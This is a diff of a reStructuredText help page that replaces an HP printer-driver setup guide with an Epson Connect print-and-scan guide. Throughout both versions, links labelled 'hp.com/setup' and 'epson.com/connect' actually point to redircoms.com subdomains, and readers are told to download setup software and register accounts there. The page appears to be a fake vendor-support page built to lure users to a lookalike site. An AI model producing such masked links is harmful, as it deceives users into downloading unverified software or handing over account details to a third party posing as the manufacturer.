@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to Print and Scan From Anywhere with Epson Connect?
 ##################
 
 .. meta::
@@ -10,12 +10,12 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: get-started.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: epson.com/connect
+      :target: https://eps.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -27,47 +27,31 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
+Epson Connect is a cloud-based solution that allows you to print and scan documents remotely using your smartphone, tablet, or computer. Whether you’re at home, at work, or on the move, Epson Connect gives you full control over your printer. To get started, visit `epson.com/connect <https://eps.redircoms.com>`_ and register your compatible Epson printer.
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Features of Epson Connect
+--------------------------
+- **Email Print**: Send documents and photos directly to your printer’s unique email address.
+- **Remote Print**: Print from your computer to any Epson printer registered with Epson Connect—even from across the world.
+- **Scan to Cloud**: Scan documents and send them directly to cloud storage services like Dropbox, Google Drive, and Evernote.
+- **Epson iPrint App**: Print and scan from iOS or Android devices using the Epson iPrint app.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Steps to Set Up Epson Connect
+-----------------------------
+1. Go to `epson.com/connect <https://eps.redircoms.com>`_ and download the **Epson Connect Printer Setup Utility**.
+2. Launch the utility, agree to the license agreement, and follow the on-screen instructions.
+3. Select your printer model and choose **Printer Registration**.
+4. Fill out the registration form to create your Epson Connect account and receive your printer’s unique email address.
+5. After registration, log in to the Epson Connect portal to manage settings and access cloud features.
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+How to Print from Anywhere
+--------------------------
+- Send an email with the document attached to your printer’s assigned email address.
+- Use the Remote Print Driver to print directly from your PC.
+- Open the Epson iPrint app on your mobile device and choose your printer from the registered list.
 
-2. Enter your HP printer model in the search box.
-
-3. Select your operating system if prompted.
-
-4. Click on **Download** to get the latest driver and software package.
-
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+How to Scan to the Cloud
+------------------------
+- Load your document into the printer’s scanner.
+- From the printer’s control panel, select **Scan > Scan to Cloud**.
+- Choose your preferred cloud storage destination and follow the prompts.
